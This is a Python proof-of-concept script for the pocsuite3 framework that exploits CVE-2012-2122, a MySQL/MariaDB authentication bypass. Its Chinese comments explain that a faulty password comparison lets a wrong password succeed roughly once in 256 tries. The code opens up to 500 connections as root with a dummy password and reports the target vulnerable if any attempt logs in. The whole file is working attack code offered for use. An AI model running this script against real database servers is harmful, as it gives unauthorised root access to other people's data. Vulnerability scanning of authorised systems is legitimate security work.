# -*- coding: utf-8 -*-
# author: seven
# mysql身份绕过CVE-2012-2122
# 当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import pymysql
import time

MAX_CONNECT_TIME = 50

def connect(host,port):
    try:
        conn = pymysql.connect(host=host,port=int(port),user='root', password='bad', database='mysql', charset='utf8')
        logger.info('{}:{} login success'.format(host,port))
        conn.close()
        return True
    except Exception as e:
        logger.debug('{}:{}\t{}'.format(host,port,str(e)))
    return False

def try_multi_connect(host,port):
    start_time = time.time()
    for i in range(500):
        if int(time.time() - start_time)>MAX_CONNECT_TIME:
            logger.info('Exceed time range')
            return False
        if connect(host,port):
            return True
    return False

class MysqlAuthBypassPOC(POCBase):
    vulID = 'CVE-2012-2122'
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 27, 2020'
    createDate = 'Jul 27, 2020'
    name = 'mysql 认证绕过'
    appName = 'mysql'
    appVersion = 'v1.0.0'
    vulType = 'unauthorized'
    protocol = 'mysql'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 3306

        result = {}
        if try_multi_connect(host,port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(MysqlAuthBypassPOC)